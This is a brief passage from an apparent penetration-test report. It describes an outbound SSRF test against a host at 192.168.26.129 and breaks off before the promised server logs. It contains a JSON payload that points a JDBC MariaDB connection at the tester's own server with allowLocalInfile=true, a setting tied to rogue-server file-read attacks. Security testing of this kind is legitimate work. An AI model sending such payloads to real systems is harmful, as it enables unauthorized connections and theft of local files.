Outbound Arbitrary Address Connection (SSRF) Test

Our side started spoofing from `192.168.26.1:13306` MariaDB server request:

```json

{"driverClassName":"org.mariadb.jdbc.Driver","url":"jdbc:mariadb://192.168.26.1:13306/test?allowLocalInfile=true","username":"root","password":"x"}

```

Our server logs (proving that the target 192.168.26.129 actively sent an outbound request and completed the handshake):

